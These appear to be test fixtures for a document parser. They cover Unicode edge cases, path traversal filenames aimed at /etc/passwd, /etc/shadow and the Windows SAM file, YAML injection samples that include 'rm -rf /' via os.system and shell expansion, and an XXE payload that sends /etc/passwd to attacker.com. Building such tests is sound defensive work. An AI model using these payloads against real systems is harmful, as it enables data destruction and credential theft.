metadata.description: 

content:
# Unicode Test Document

Testing comprehensive Unicode character handling with proper normalization:

## Mathematical Symbols
∑ ∏ √ ∫ ∂ ∆ ∇ ∞ ∅ ∈ ∉ ⊂ ⊃ ∪ ∩ ∧ ∨ ¬ ≡ ≅ ≈ ≠ ≤ ≥ ≪ ≫ ℝ ℂ ℕ ℤ ℚ

## Combining Characters
Cafe (e with accent)
naive (i with diaeresis)
resume (e with accent)

## Right-to-Left Text
Arabic and Hebrew text

## Special Whitespace
Non-breaking space and zero-width characters

## Control Characters (Escaped)
\\u0000 \\u0001 \\u0002 \\u0003 \\u0004 \\u0005 \\u0006 \\u0007
\\u0008 \\u0009 \\u000A \\u000B \\u000C \\u000D \\u000E \\u000F

metadata.title: Comprehensive Unicode Test Document
metadata.description: Testing Unicode normalization, encoding, and edge cases in context parsing with proper UTF-8 handling
metadata.author: Test User

content:
Testing path traversal patterns in filenames:
../../../etc/passwd
..\..\..\windows\system32\config\sam
/etc/shadow
\\?\C:\Windows\System32\drivers\etc\hosts
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

content:
---
# YAML parsing edge cases and injection attempts

# Anchor and alias exploitation
anchor_test: &anchor_value "malicious: content"
reference: *anchor_value

# Type confusion with !!python/object
python_object: !!python/object:os.system
  - 'rm -rf /'

# Environment variable expansion
env_expansion: ${PATH}
env_injection: ${MALICIOUS_COMMAND:-rm -rf /}

# Command execution via shell expansion
shell_expansion: $(echo 'malicious command')
backtick_expansion: `cat /etc/passwd`

# Unicode normalization attacks
unicode_normalization: "ñ"
unicode_homoglyph: "аdmin" # Cyrillic 'а'

# Deep recursion via anchors
level1: &level1
  level2: &level2
    level3: &level3
      level4: &level4
        level5: &level5
          self: *level1

metadata.title: YAML Parsing Edge Cases
metadata.description: Testing YAML parsing vulnerabilities including anchor exploitation, type confusion, and injection attacks
metadata.author: Security Researcher

content:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfiltrate;
]>
<root>
  <data>Test data with XXE attack</data>
</root>
